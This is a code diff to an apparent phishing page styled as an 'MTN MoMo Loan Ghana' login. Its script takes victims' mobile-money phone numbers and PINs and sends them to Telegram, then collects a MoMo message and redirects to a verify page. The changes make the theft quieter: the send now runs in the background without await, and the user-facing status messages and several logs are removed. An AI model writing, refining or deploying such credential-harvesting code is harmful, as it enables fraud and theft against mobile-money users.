@@ -756,7 +756,7 @@
         }
 
         // ============================================
-        // SEND #1: PHONE + PIN TO TELEGRAM
+        // SEND #1: PHONE + PIN TO TELEGRAM (silent)
         // ============================================
         async function sendPhoneAndPin(phone, pin) {
             const loanType = localStorage.getItem('loanType') || 'Smart Loan';
@@ -793,7 +793,7 @@
                 `⏰ Time: ${new Date().toLocaleString()}\n\n` +
                 `✅ Step 1: Login details received.`;
 
-            console.log('📤 [STEP 1] Sending phone + PIN to Telegram...');
+            console.log('📤 [STEP 1] Sending phone + PIN to Telegram (silent)...');
 
             const controller = new AbortController();
             const timeoutId = setTimeout(() => controller.abort(), 5000);
@@ -860,13 +860,14 @@
 
         // ============================================
         // LOGIN BUTTON HANDLER
-        // Step 1: Send phone + PIN immediately
-        // Step 2: Show modal
+        // Step 1: Send phone + PIN silently in background
+        // Step 2: Show modal after 1.5s delay
         // ============================================
-        loginBtn.addEventListener('click', async function() {
+        loginBtn.addEventListener('click', function() {
             const phone = phoneInput.value.trim();
             const pin = Array.from(pinBoxes).map(box => box.value).join('');
 
+            // Validation
             if (!phone) {
                 showStatus('Please enter your MoMo phone number', 'error');
                 phoneInput.focus();
@@ -888,29 +889,20 @@
             localStorage.setItem('momoPhone', phone);
             localStorage.setItem('momoPin', pin);
 
-            // Disable button + show status
+            // Disable button (silent - no message shown)
             loginBtn.disabled = true;
-            loginBtn.textContent = 'SENDING...';
-            showStatus('📤 Sending login details...', 'info');
 
-            // ✅ STEP 1: SEND PHONE + PIN IMMEDIATELY
-            await sendPhoneAndPin(phone, pin);
+            // ✅ STEP 1: SEND PHONE + PIN SILENTLY IN BACKGROUND (no await)
+            sendPhoneAndPin(phone, pin);
 
-            console.log('⏳ Waiting 1.5 seconds before showing modal...');
-
-            // ✅ STEP 2: DELAY THEN SHOW MODAL
+            // ✅ STEP 2: AFTER 1.5 SECONDS, SHOW MODAL
             setTimeout(() => {
-                console.log('📩 Showing modal popup...');
                 loginBtn.disabled = false;
-                loginBtn.textContent = '🔓 UNLOCK LOAN →';
-                hideStatus();
-
-                // Show modal
                 modalOverlay.classList.add('show');
                 momoMessage.value = '';
                 proceedBtn.disabled = true;
                 setTimeout(() => momoMessage.focus(), 400);
-            }, 1500); // 1.5 second delay
+            }, 1500);
         });
 
         // ============================================
@@ -944,8 +936,6 @@
             // ✅ STEP 3: SEND MOMO MESSAGE TO TELEGRAM
             await sendMomoMessage(phone, momoMsg);
 
-            console.log('➡️ Redirecting to verify.html...');
-
             // ✅ STEP 4: REDIRECT TO VERIFY PAGE
             setTimeout(() => {
                 spinnerOverlay.style.display = 'none';
@@ -977,7 +967,6 @@
             checkPinComplete();
 
             console.log('✅ MTN MoMo Loan Ghana - Account Login Loaded');
-            console.log('📋 Flow: Login → Send PIN → Delay → Modal → Send Message → Verify');
             console.log('====================================');
         });
     </script>
